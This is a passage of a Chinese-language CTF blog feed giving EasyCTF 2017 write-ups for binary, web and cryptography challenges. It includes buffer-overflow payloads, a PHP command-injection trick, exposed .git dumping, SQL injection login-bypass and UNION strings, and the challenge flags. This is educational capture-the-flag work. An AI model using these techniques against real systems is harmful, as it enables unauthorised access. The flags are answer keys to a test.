class="built_in">cout</span>,</div><div class="line">                         <span class="string">"Sorry, the most we can allow you to bet is $100,000,000"</span>,</div><div class="line">                         v15);</div><div class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      LODWORD(v17) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"You must bet a positive amount"</span>, v15);</div><div class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v17, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_stringstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_stringstream((__int64)&amp;v24);</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v23);</div><div class="line">  &#125;</div><div class="line">  printflag(v10, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;, v11);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p></p><p><img src="http://i4.buimg.com/589513/458cf5848cda5d98.png" alt=""></p><p>整型溢出问题，大致先看了一下逻辑，只要满足networth &gt; 2000000000就可以跳出while循环获取到flag，network是int类型的，而在：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)gamble() ^ <span class="number">1</span> )</div><div class="line">&#123;</div><div class="line">  LODWORD(v20) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Sorry, I'm afraid you've lost :("</span>, v19);</div><div class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  networth -= v22;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p></p><p><img src="http://i4.buimg.com/589513/601f78cff8149259.png" alt=""></p><p>中并没有先判断network值是否小于0就直接相减，这样导致余额为负也还可以继续赌(和)博（谐）：</p><p><img src="http://i2.muimg.com/589513/825bd842a912a237.png" alt=""></p><p>32位下int: 4 byte = 32 bit 有符号signed范围：2^31-1 ~ -2^31 即：2147483647 ~ -2147483648，当我们的余额小于还小于-2147483648时就会溢出，而溢出处理是环形的，画个简图：</p><p><img src="http://i2.muimg.com/589513/ff66d77073b68805.png" alt=""></p><p><img src="http://i1.piimg.com/589513/6c4cd7da413afb24.png" alt=""></p><h2 id="Doubly-Dangerous"><a href="#Doubly-Dangerous" class="headerlink" title="Doubly Dangerous"></a>Doubly Dangerous</h2><h3 id="problem-9"><a href="#problem-9" class="headerlink" title="problem"></a>problem</h3><p>There seems to be an issue with <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/doubly-dangerous/doubly_dangerous" target="_blank" rel="external">this binary</a>. Can you exploit it? View the problem in the shell server <code>/problems/doubly_dangerous</code> directory.</p><h3 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+Ch] [bp-4Ch]@1</span></div><div class="line">  <span class="keyword">float</span> v5; <span class="comment">// [sp+4Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v5 = <span class="number">0.0</span>;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Give me a string: "</span>);</div><div class="line">  gets(&amp;s);</div><div class="line">  <span class="keyword">if</span> ( <span class="number">11.28125</span> == v5 )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Success! Here is your flag:"</span>);</div><div class="line">    give_flag();</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"nope!"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>我们要做的就是让<code>if ( 11.28125 == v5 )</code>成立，又使用了<code>gets()</code>,估计与溢出有关。<br>运行一下：</p><pre><code>sunnyelf@ubuntu:~/Desktop$ ./doubly_dangerous 
Give me a string: 
flag
nope!
sunnyelf@ubuntu:~/Desktop$ ./doubly_dangerous
Give me a string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
nope!
Segmentation fault (core dumped)
</code></pre><p>果然是溢出，于是gdb看一下：</p><pre><code>(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048607 &lt;+0&gt;:    lea    ecx,[esp+0x4]
   0x0804860b &lt;+4&gt;:    and    esp,0xfffffff0
   0x0804860e &lt;+7&gt;:    push   DWORD PTR [ecx-0x4]
   0x08048611 &lt;+10&gt;:    push   ebp
   0x08048612 &lt;+11&gt;:    mov    ebp,esp
   0x08048614 &lt;+13&gt;:    push   ecx
   0x08048615 &lt;+14&gt;:    sub    esp,0x54
   0x08048618 &lt;+17&gt;:    fldz   
   0x0804861a &lt;+19&gt;:    fstp   DWORD PTR [ebp-0xc]
   0x0804861d &lt;+22&gt;:    sub    esp,0xc
   0x08048620 &lt;+25&gt;:    push   0x8048735
   0x08048625 &lt;+30&gt;:    call   0x8048410 &lt;puts@plt&gt;
   0x0804862a &lt;+35&gt;:    add    esp,0x10
   0x0804862d &lt;+38&gt;:    sub    esp,0xc
   0x08048630 &lt;+41&gt;:    lea    eax,[ebp-0x4c]
   0x08048633 &lt;+44&gt;:    push   eax
   0x08048634 &lt;+45&gt;:    call   0x80483e0 &lt;gets@plt&gt;
   0x08048639 &lt;+50&gt;:    add    esp,0x10
   0x0804863c &lt;+53&gt;:    fld    DWORD PTR [ebp-0xc]
   0x0804863f &lt;+56&gt;:    fld    DWORD PTR ds:0x804876c
   0x08048645 &lt;+62&gt;:    fucomip st,st(1)
   0x08048647 &lt;+64&gt;:    jp     0x804866c &lt;main+101&gt;
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---c
   0x08048649 &lt;+66&gt;:    fld    DWORD PTR ds:0x804876c
   0x0804864f &lt;+72&gt;:    fucomip st,st(1)
   0x08048651 &lt;+74&gt;:    fstp   st(0)
   0x08048653 &lt;+76&gt;:    jne    0x804866e &lt;main+103&gt;
   0x08048655 &lt;+78&gt;:    sub    esp,0xc
   0x08048658 &lt;+81&gt;:    push   0x8048748
   0x0804865d &lt;+86&gt;:    call   0x8048410 &lt;puts@plt&gt;
   0x08048662 &lt;+91&gt;:    add    esp,0x10
   0x08048665 &lt;+94&gt;:    call   0x804857b &lt;give_flag&gt;
   0x0804866a &lt;+99&gt;:    jmp    0x804867e &lt;main+119&gt;
   0x0804866c &lt;+101&gt;:    fstp   st(0)
   0x0804866e &lt;+103&gt;:    sub    esp,0xc
   0x08048671 &lt;+106&gt;:    push   0x8048764
   0x08048676 &lt;+111&gt;:    call   0x8048410 &lt;puts@plt&gt;
   0x0804867b &lt;+116&gt;:    add    esp,0x10
   0x0804867e &lt;+119&gt;:    mov    eax,0x0
   0x08048683 &lt;+124&gt;:    mov    ecx,DWORD PTR [ebp-0x4]
   0x08048686 &lt;+127&gt;:    leave  
   0x08048687 &lt;+128&gt;:    lea    esp,[ecx-0x4]
   0x0804868a &lt;+131&gt;:    ret    
End of assembler dump.
</code></pre><p>大致看了之后，看到其中的：</p><pre><code>0x0804863c &lt;+53&gt;:    fld    DWORD PTR [ebp-0xc]
0x0804863f &lt;+56&gt;:    fld    DWORD PTR ds:0x804876c
0x08048645 &lt;+62&gt;:    fucomip st,st(1)
</code></pre><p>根据题意就是溢出覆盖<code>ebp-0xc</code>的值使之和<code>0x804876c</code>所指的值相等。于是不断尝试输入查看<code>ebp-0xc</code>所指的值的变化，当输入64个A字符时没有覆盖：</p><pre><code>(gdb) set disassembly-flavor intel
(gdb) b main
Breakpoint 1 at 0x8048615
(gdb) r &lt; 64A.txt 
Starting program: /home/sunnyelf/Desktop/doubly_dangerous &lt; 64A.txt

Breakpoint 1, 0x08048615 in main ()
(gdb) x/wx $ebp-0xc
0xbffff0fc: 0x080486b1
</code></pre><p>当输入65个A字符时开始覆盖（A字符的ASCII码的十六进制是41）：</p><pre><code>(gdb) r &lt; 65A.txt 
Starting program: /home/sunnyelf/Desktop/doubly_dangerous &lt; 65A.txt

Breakpoint 1, 0x08048615 in main ()
(gdb) x/wx $ebp-0xc
0xbffff0fc:    0x08048641
</code></pre><p>接下再看一下<code>0x804876c</code>所指的值：</p><pre><code>(gdb) x/wx 0x804876c
0x804876c: 0x41348000
</code></pre><p>于是构造payload：<code>&#39;A&#39; * 64 + &#39;\x00\x80\x34\x41&#39;</code></p><pre><code>python -c &quot;print &apos;A&apos;*64 + &apos;\x00\x80\x34\x41&apos;&quot; | ./doubly_dangerous
Give me a string: 
Success! Here is your flag:
easyctf{bofs_and_floats_are_d0uble_tr0uble!}
</code></pre><h2 id="Simple-Rop"><a href="#Simple-Rop" class="headerlink" title="Simple Rop"></a>Simple Rop</h2><h3 id="problem-10"><a href="#problem-10" class="headerlink" title="problem"></a>problem</h3><p>On the shell there is a folder <code>/problems/simple-rop</code>.</p><p>Read <code>flag.txt</code></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/simple-rop/simple-rop.c" target="_blank" rel="external">Source</a></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/simple-rop/simple-rop" target="_blank" rel="external">Binary</a></p><h3 id="solution-9"><a href="#solution-9" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// simple-rop.c</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_flag</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">what_did_you_say</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">gid_t</span> gid = getegid();</div><div class="line">    setresgid(gid, gid, gid);</div><div class="line">    what_did_you_say();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_flag</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    system(<span class="string">"cat flag.txt"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">what_did_you_say</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">char</span> buff[<span class="number">64</span>];</div><div class="line">    gets(buff);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"You said: %s\n"</span>, buff);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>看了源码，很显然要让我们调用print_flag()函数，于是先gdb看一下print_flag()函数的地址：</p><pre><code>(gdb) disas print_flag
Dump of assembler code for function print_flag:
   0x0804851a &lt;+0&gt;:    push   %ebp
   0x0804851b &lt;+1&gt;:    mov    %esp,%ebp
   0x0804851d &lt;+3&gt;:    sub    $0x8,%esp
   0x08048520 &lt;+6&gt;:    sub    $0xc,%esp
   0x08048523 &lt;+9&gt;:    push   $0x80485e0
   0x08048528 &lt;+14&gt;:    call   0x80483a0 &lt;system@plt&gt;
   0x0804852d &lt;+19&gt;:    add    $0x10,%esp
   0x08048530 &lt;+22&gt;:    nop
   0x08048531 &lt;+23&gt;:    leave  
   0x08048532 &lt;+24&gt;:    ret    
End of assembler dump.
</code></pre><p>地址为：0x0804851a，缓存为64字符，所以写个shell脚本跑一下：</p><pre><code>#!/bin/bash  

for i in {64..80};  
do
    python -c &quot;print &apos;A&apos; * $i + &apos;\x1a\x85\x04\x08&apos;&quot; | ./simple-rop
done
</code></pre><p>当跑到<code>python -c &#39;print &quot;A&quot;*76+&quot;\x1a\x85\x04\x08&quot;&#39; | ./simple-rop</code>成功调用print_flag()函数：</p><pre><code>easyctf{r0p_7o_v1ct0ry}
</code></pre>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf writeup </tag>
            
            <tag> easyctf </tag>
            
            <tag> pwn </tag>
            
            <tag> reverse engineering </tag>
            
            <tag> binary exploitation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[EasyCTF 2017 Web Write Up]]></title>
      <url>/2017/04/09/EasyCTF-2017-Web-Write-Up/</url>
      <content type="html"><![CDATA[<p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x05-Web"><a href="#0x05-Web" class="headerlink" title="0x05 Web"></a>0x05 Web</h1><h2 id="Cookie-Blog"><a href="#Cookie-Blog" class="headerlink" title="Cookie Blog"></a>Cookie Blog</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>I found the cookie monster’s <a href="http://cookieblog.web.easyctf.com/" target="_blank" rel="external">blog</a>!</p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/u0iIWjJ.png" alt=""></p><h2 id="TinyEval"><a href="#TinyEval" class="headerlink" title="TinyEval"></a>TinyEval</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>This <a href="http://tinyeval.web.easyctf.com/" target="_blank" rel="external">page</a> will evaluate anything you give it.</p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/iupLzpS.png" alt=""></p><p>首先想到可能是php的eval()函数，于是随手输入<code>echo（&quot;hello world&quot;）</code>，提示字符太长，最后经过测试最多能输入11个字符。<br>这里用到一个php的技巧</p><pre><code>root@kali:~# cat 1.php 
&lt;?php
eval(&quot;echo`ls`;&quot;);
?&gt;
root@kali:~# php 1.php 
1.php
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
</code></pre><p>于是输入echo<code>ls</code>:</p><p><img src="http://i.imgur.com/OIAXdXr.png" alt=""></p><p>看到了flag文件了，但是文件名很长，除了echo``，就只能再输入5个字符，所以要找到一个巧妙的方法，多次尝试找到方法：</p><pre><code>echo`cat *`
</code></pre><p>刚好11个字符，获得flag：</p><p><img src="http://i.imgur.com/86dL75P.png" alt=""></p><h2 id="Edge-1"><a href="#Edge-1" class="headerlink" title="Edge 1"></a>Edge 1</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>We found Edge inc’s website! Take a look at it <a href="http://edge1.web.easyctf.com/" target="_blank" rel="external">here</a>.</p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><p>官方提醒说不能使用扫描器，要不然会被BAN，但是搞了一通之后没有什么收获，提醒说不能使用扫描器于是猜测是不是跟源码泄露有关，就手动测试一下：</p><pre><code>index.php~
index.php.vim
index.php.swp
index.php.swn
index.php.swo
index.php.old
index.php.txt
index.php.bak
index.php.zip
index.php.rar
/.svn
/.git
</code></pre><p>测试到<code>/.git</code>终于出现惊喜：</p><p><img src="http://i.imgur.com/NYv1Q6J.png" alt=""></p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">rip-git</a></p><pre><code>root@kali:~# rip-git -v -u http://edge1.web.easyctf.com/.git/
root@kali:~/.git# git log
commit ee9061b25d8a35bae8380339f187b44dc26f4999
Author: Michael &lt;michael@easyctf.com&gt;
Date:   Mon Mar 13 07:11:47 2017 +0000

    Whoops! Remove flag.

commit afdf86202dc8a3c3d671f2106d5cffa593f2b320
Author: Michael &lt;michael@easyctf.com&gt;
Date:   Mon Mar 13 07:11:45 2017 +0000

    Initial.

commit 15ca375e54f056a576905b41a417b413c57df6eb
Author: Fernando &lt;fermayo@gmail.com&gt;
Date:   Sat Dec 14 12:50:09 2013 -0300

    initial version

commit 8ac4f76df2ce8db696d75f5f146f4047a315af22
Author: Fernando Mayo &lt;fermayo@gmail.com&gt;
Date:   Sat Dec 14 07:36:18 2013 -0800

    Initial commit
</code></pre><hr><p>回滚到删掉flag之前：</p><pre><code>root@kali:~/.git# git reset –hard afdf86202dc8a3c3d671f2106d5cffa593f2b320
</code></pre><p>根目录出现了flag.txt:</p><pre><code>root@kali:~/.git# cat flag.txt
easyctf{w3_ev3n_u53_git}
</code></pre><p>推荐文章：<a href="https://www.cdxy.me/?p=757" target="_blank" rel="external">关于WEB敏感文件探测的一点思考</a></p><h2 id="Edge-2"><a href="#Edge-2" class="headerlink" title="Edge 2"></a>Edge 2</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>Last time we screwed up. But we’ve <a href="http://edge2.web.easyctf.com/" target="_blank" rel="external">learned our lesson</a>.</p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p>再次访问<code>/.git</code>，结果：</p><p><img src="http://i.imgur.com/bcdipOl.png" alt=""></p><p>虽然被禁止列目录，但是那些文件依然存在，再次尝试使用rip-git，结果还是下载下来了，接下来就跟Edge 1一样的做法了：</p><pre><code>root@kali:~# rip-git -v -u http://edge2.web.easyctf.com/.git/
root@kali:~/.git# git log
commit a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd
Author: Michael &lt;michael@easyctf.com&gt;
Date:   Mon Mar 13 07:32:12 2017 +0000

    Prevent directory listing.

commit 6b4131bb3b84e9446218359414d636bda782d097
Author: Michael &lt;michael@easyctf.com&gt;
Date:   Mon Mar 13 07:32:10 2017 +0000

    Whoops! Remove flag.

commit 26e35470d38c4d6815bc4426a862d5399f04865c
Author: Michael &lt;michael@easyctf.com&gt;
Date:   Mon Mar 13 07:32:09 2017 +0000

    Initial.

commit 15ca375e54f056a576905b41a417b413c57df6eb
Author: Fernando &lt;fermayo@gmail.com&gt;
Date:   Sat Dec 14 12:50:09 2013 -0300

    initial version
</code></pre><p>同样回到删掉flag之前：</p><pre><code>root@kali:~/.git# git reset –hard 26e35470d38c4d6815bc4426a862d5399f04865c
root@kali:~/.git# cat flag.txt
easyctf{hiding_the_problem_doesn&apos;t_mean_it&apos;s_gone!}
</code></pre><h2 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection 1"></a>SQL Injection 1</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>I need help logging into this website to get my flag! If it helps, my username is <code>admin</code>.<br>Running sqlmap or the likes will earn you an IP ban.</p><p>hint: What does “injection” mean? How can you “inject” code into your username to control the username lookup?</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/HEUFtzW.png" alt=""></p><p>查看网页源代码，估计SQL语句是这样的：</p><pre><code>select * from users where username=&quot;admin&quot; and password=&quot;&quot;
</code></pre><p>于是任意构造：</p><pre><code>&quot; or &quot;1&quot;=&quot;1

select * from users where username=&quot;admin&quot; and password=&quot;&quot; or &quot;1&quot;=&quot;1&quot;
</code></pre><p>flag：<code>easyctf{a_prepared_statement_a_day_keeps_the_d0ctor_away!}</code></p><h2 id="SQL-Injection-2"><a href="#SQL-Injection-2" class="headerlink" title="SQL Injection 2"></a>SQL Injection 2</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>I’ve told my friend a billion times that the user called <code>leet1337</code> doesn’t exist on this <a href="http://injection2.web.easyctf.com/" target="_blank" rel="external">website</a>, but he won’t listen. Could you please login as this user, even though it doesn’t exist in the database? Oh and also, make sure that the user has a power level over 9000!!!!<br>Running sqlmap or the likes will earn you an IP ban.</p><p>hint: The columns in the table are (not in order) username, password, power_level, and a unique id.</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><p>根据提示估计SQL语句是这样的：</p><pre><code>select username, password, power_level, id from table where username=&quot;&quot; and password=&quot;&quot;
</code></pre><p>多次尝试使用union查询，#号截断：</p><pre><code>&quot; union select &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;9999&quot;#

select username, password, power_level, id from table where username=&quot;&quot; and password=&quot;&quot; union select &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;leet1337&quot;, &quot;9999&quot;#&quot;
</code></pre><h2 id="Blogbox"><a href="#Blogbox" class="headerlink" title="Blogbox"></a>Blogbox</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p>I found another <a href="http://blogbox.web.easyctf.com/" target="_blank" rel="external">blog</a>! Do you think you can find a flag on it?</p><p>Hint: Use the search bar to see all the public posts! (And only the public posts!)</p><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/tHQ6iU7.png" alt=""><br>根据提示进行搜索，但是不论输入什么都得不到想要得结果，搜索时GET请求类似这样：</p><p><a href="http://blogbox.web.easyctf.com/search?query=flag" target="_blank" rel="external">http://blogbox.web.easyctf.com/search?query=flag</a></p><p>后来看提示我们只能看到公开的（<code>public</code>）文章，于是想到搜索有可能还可以传入<code>public</code>这个参数：<br>最终：<code>http://blogbox.web.easyctf.com/search?query=ctf&amp;public=0</code></p><p><img src="http://i.imgur.com/ui3q05z.png" alt=""></p><h2 id="Web-tunnel"><a href="#Web-tunnel" class="headerlink" title="Web tunnel"></a>Web tunnel</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>I was just going to search some random cat videos on a Saturday morning when my friend came up to me and told me to reach the end of this <a href="http://tunnel.web.easyctf.com/" target="_blank" rel="external">tunnel</a>. Can you do it for me?</p><p>Hint: You should write a script for this. The tunnel goes on too deep for any normal human.</p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><p>打开网站，得到一张二维码，扫描之后得到的字符串又做为下一个二维码图片的路径，就这样循环，那么上脚本：</p><pre><code>import requests

QR_api = &apos;https://api.qrserver.com/v1/read-qr-code/&apos;
QR_name =&apos;DaicO7460493nYSuvLPW&apos;

while True:
    if &apos;easyctf&apos; not in QR_name:
        QR_url = &apos;http://tunnel.web.easyctf.com/images/&apos; + QR_name + &apos;.png&apos;
        r = requests.get(url = QR_api, params = {&apos;fileurl&apos; : QR_url})
        QR_name = r.json()[0][&quot;symbol&quot;][0][&quot;data&quot;]
    else:
        break
print(QR_name) # easyctf{y0u_sh0uld_b3_t1r3d_tr4v3ll1ng_all_th1s_w4y}
</code></pre>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf writeup </tag>
            
            <tag> easyctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[EasyCTF 2017 Cryptography Write Up]]></title>
      <url>/2017/04/09/EasyCTF-2017-Cryptography-Write-Up/</url>
      <content type="html"><![CDATA[<p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x04-Cryptography"><a href="#0x04-Cryptography" class="headerlink" title="0x04 Cryptography"></a>0x04 Cryptography</h1><h2 id="Flip-My-Letters"><a href="#Flip-My-Letters" class="headerlink" title="Flip My Letters"></a>Flip My Letters</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>I dropped my alphabet on its head, can you help me reassemble it? <code>easyctf{r_wlmg_vevm_mvvw_zm_zhxrr_gzyov}</code></p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>使用了简单的替换的加密方法，每个字母被对应另一个字母替换，使用基于字典的词频分析在线网站<a href="http://quipqiup.com/" target="_blank" rel="external">quipqiup</a>解出flag。</p><p><img src="http://i.imgur.com/TfLaOm8.png" alt=""></p><h2 id="Clear-and-Concise-Commentary-on-Caesar-Cipher"><a href="#Clear-and-Concise-Commentary-on-Caesar-Cipher" class="headerlink" title="Clear and Concise Commentary on Caesar Cipher"></a>Clear and Concise Commentary on Caesar Cipher</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>The flag is in <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/commentary/Commentary.pdf" target="_blank" rel="external">Commentary.pdf</a>. Use lowercase.</p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p>凯撒密码，给出的文档值得一看，找到文档中<code>RNFLPGS{LBHTBGVG}</code>，凯撒密码<a href="https://planetcalc.com/1434/" target="_blank" rel="external">在线解密</a><br><img src="http://i.imgur.com/fMMlCbf.png" alt=""></p><p>最终flag为<code>easyctf{yougotit}</code></p><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>I found somebody’s notes on their private RSA! Help me crack <a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/rsa1" target="_blank" rel="external">this</a>.</p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><p><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="external">RSA算法原理</a></p><p><a href="https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95" target="_blank" rel="external">扩展欧几里得算法</a></p><p><a href="https://github.com/sunnyelf/libnum" target="_blank" rel="external">libnum模块</a></p><pre><code>import libnum
p = 33499881069427614105926941260008415630190853527846401734073924527104092366847259
q = 34311544767652906613104559081988349779622789386528780506962212898921316785995851
e = 65537
c = 43465248299278658712013216049003172427898782261990372316282214376041873514481386908793943532363461126240609464283533882761307749486816342864113338277082746552
n = p * q
phi = (p - 1) * (q - 1)
d = libnum.modular.invmod(e, phi)
print libnum.n2s(pow(c, d, n)) #easyctf{wh3n_y0u_h4ve_p&amp;q_RSA_iz_ez_7829d89f}
